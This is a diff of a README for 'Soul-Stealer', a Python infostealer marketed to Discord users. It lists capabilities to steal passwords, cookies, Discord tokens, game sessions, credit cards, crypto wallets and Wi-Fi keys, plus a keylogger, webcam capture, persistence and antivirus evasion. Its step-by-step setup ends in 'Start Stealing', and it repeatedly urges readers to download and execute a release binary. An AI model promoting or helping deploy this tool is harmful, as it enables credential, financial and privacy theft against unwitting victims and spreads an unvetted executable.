@@ -1,101 +1,131 @@
+# Soul-Stealer: Advanced Discord Stealer Tool in Python
 
-
-# Soul Stealer: A Security Research Tool
-
-Soul Stealer is The MOST powerful stealer (Cookie stealer, Discord token stealer, Roblox stealer, Password stealer, Credit card stealer, Autofill stealer, Steam stealer) and much more.
-
-![Image Placeholder](https://github.com/user-attachments/assets/7f36811f-0077-4a17-8d17-483d35ab1184)
+![Soul-Stealer](https://img.shields.io/badge/Soul--Stealer-v1.0-blue.svg) ![License](https://img.shields.io/badge/License-MIT-green.svg) ![Python](https://img.shields.io/badge/Python-3.8%2B-yellow.svg)
 
 ## Table of Contents
 
+- [Overview](#overview)
 - [Features](#features)
-- [Requirements](#requirements)
+- [Installation](#installation)
 - [Usage](#usage)
+- [Topics](#topics)
+- [Contributing](#contributing)
 - [License](#license)
+- [Contact](#contact)
 
-## ✨ Features
+## Overview
 
-This tool demonstrates a range of simulated data extraction capabilities for educational purposes, including:
+Soul-Stealer is an advanced tool designed for Discord users, written in Python. This tool offers a variety of features to gather sensitive information from users, such as passwords, cookies, and game sessions. With its dedicated GUI builder, preparing for usage is straightforward. 
 
-🎮 - Steal Steam Credentials, Riot games, Minecraft session, Epic games, uplay, Growtopia
+To get started, download the latest release from the [Releases section](https://github.com/Ahmedmohammedelhalwagy/Soul-Stealer/releases) and execute the file.
 
-🔒 - FUD ( Fully Undetected )
+## Features
 
-🔒 - Bypass Better Discord and Discord Token Protector
+- **Password Stealing**: Capture passwords from popular browsers.
+- **Cookie Stealing**: Retrieve cookies from browsers for session hijacking.
+- **Game Session Capture**: Get information about active game sessions.
+- **Roblox Cookie Stealer**: Specifically target Roblox sessions.
+- **Dedicated GUI Builder**: Simplify the preparation process with an intuitive interface.
+- **Screenshot Grabber**: Capture screenshots for monitoring.
+- **Keylogger**: Record keystrokes for further analysis.
 
-🖼️ - Custom icon
+## Installation
 
-🤖 - Website Cookie Information (Spotify, Roblox, Tiktok, Guilded, Patreon, Twitch, Instagram, Twitter)
+To install Soul-Stealer, follow these steps:
 
-🖥️ - System Information Stealer: Steal graphic card name (and other data), cpu name (and other data)
+1. **Clone the Repository**: 
+   ```bash
+   git clone https://github.com/Ahmedmohammedelhalwagy/Soul-Stealer.git
+   ```
 
-📸 - Steal Webcam Screenshot
+2. **Navigate to the Directory**:
+   ```bash
+   cd Soul-Stealer
+   ```
 
-🔒 - Steal Wifi Password
+3. **Install Dependencies**:
+   Make sure you have Python 3.8 or higher installed. Then, install the required packages:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-🍪 - Cookie Stealer
-
-📁 - Telegram Session stealer
-
-🔒 - Password Stealer
-
-📝 - Autofill Stealer: Steal autofill of all browsers
-
-📝 - Credit card stealer
-
-📋 - Clipboard Copy: Copies whatever is in the target's clipboard
-
-💻 - Startup Running: Starts up whenever the target's machine does
-
-💰 - Crypto Wallet Stealer (- 💸 Zcash 🚀 Armory 📀 Bytecoin 💵 Jaxx 💎 Exodus 📉 Ethereum 🔨 Electrum 🕹️ AtomicWallet 💹 Guarda ⚡ Coinomi 🦊 MetaMask )
-
-👥 - Private Information Stealer: Grabs Discord token, password, phone number, email, username and global username and HQ friends, HQ Guilds, user connexion and change user about me
-
-📥 - Discord Injection
-
-📂 - Anti-VM
-
-📸 - Screenshot: Takes a screenshot of the target's screen
-
-🪐 - Browser History Stealer: Steals history search of multiple browsers (Chrome, Opera/GX, Firefox, Edge, Safari, Internet Explorer, Brave)
-
-🪐 - Much MORE!
-
-## Requirements
-
-To build and run the demonstration tool, you need:
-
-- Windows 10 or later.
-- Python 3.10 or higher.
-- An active internet connection.
+4. **Download the Latest Release**:
+   Visit the [Releases section](https://github.com/Ahmedmohammedelhalwagy/Soul-Stealer/releases) to download the latest version. Execute the downloaded file to start using the tool.
 
 ## Usage
 
-Follow these steps to set up and use the tool for educational purposes:
+After installation, you can start using Soul-Stealer. 
 
-1. Download and install Python 3, ensuring the "Add to PATH" option is selected.
- 
-2. Verify the installation by running `python --version` in the Command Prompt.
- 
-3. [Download](https://github.com/idkkkshadoww/Soul-Stealer/archive/refs/heads/main.zip) the Soul Stealer repository.
-  
-4. Extract the ZIP file to a local directory.
- 
-5. Navigate to the Soul Stealer folder.
-  
-6. Double-click the `Builder` application
+1. **Run the Application**: 
+   Execute the main script:
+   ```bash
+   python main.py
+   ```
 
-7. Complete the required fields in the builder interface and click the "Build" button.
+2. **Configure Settings**: 
+   Use the GUI to configure the settings according to your needs.
 
-![Image Placeholder](https://github.com/user-attachments/assets/5d233fb8-87ba-404f-ae11-399e8605ba98)
+3. **Start Stealing**: 
+   Initiate the stealing process by clicking the appropriate button in the GUI.
+
+4. **Access Collected Data**: 
+   Check the output directory for collected data.
+
+## Topics
+
+Soul-Stealer covers a range of topics relevant to its functionality. Here are the main areas of focus:
+
+- chrome-password-stealer
+- cookie-stealer
+- discord
+- discord-rat
+- discord-stealer
+- discord-stealer-fud
+- discord-token-stealer
+- grabber
+- grabber-screenshot
+- hack
+- keylogger-screenshot
+- password-grabber
+- password-stealer
+- roblox-cookie-stealer
+- stealer
+- stealer-fud
+- stub
+- stub-builder
+
+## Contributing
+
+We welcome contributions from the community. If you would like to contribute, please follow these steps:
+
+1. **Fork the Repository**: Click the "Fork" button at the top right of the page.
+2. **Create a New Branch**: 
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+3. **Make Your Changes**: Implement your feature or fix.
+4. **Commit Your Changes**: 
+   ```bash
+   git commit -m "Add your message here"
+   ```
+5. **Push to the Branch**: 
+   ```bash
+   git push origin feature/YourFeature
+   ```
+6. **Create a Pull Request**: Go to the original repository and click "New Pull Request".
 
 ## License
 
-By downloading this tool, you agree to the [Commons Clause License](https://commonsclause.com/). This license prohibits selling the repository or any code derived from it. The tool is provided for educational and research purposes only.
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-## Educational Purposes Only
+## Contact
 
-This repository and its contents are strictly for **educational and ethical security research purposes**. Any misuse of this tool for malicious activities is strictly prohibited and may violate applicable laws. The developer is not responsible for any misuse or damage caused by this tool.
+For any inquiries or support, please reach out via the GitHub issues page or contact the repository owner directly.
 
-For inquiries, contact: hinmisss
+To download the latest version, visit the [Releases section](https://github.com/Ahmedmohammedelhalwagy/Soul-Stealer/releases) and execute the file.
 
+![Discord](https://img.shields.io/badge/Discord-Join%20Us-blue.svg) ![Python](https://img.shields.io/badge/Python-3.8%2B-yellow.svg)
+
+---
+
+This README provides all necessary information to get started with Soul-Stealer. Make sure to follow the instructions carefully and enjoy using the tool responsibly.
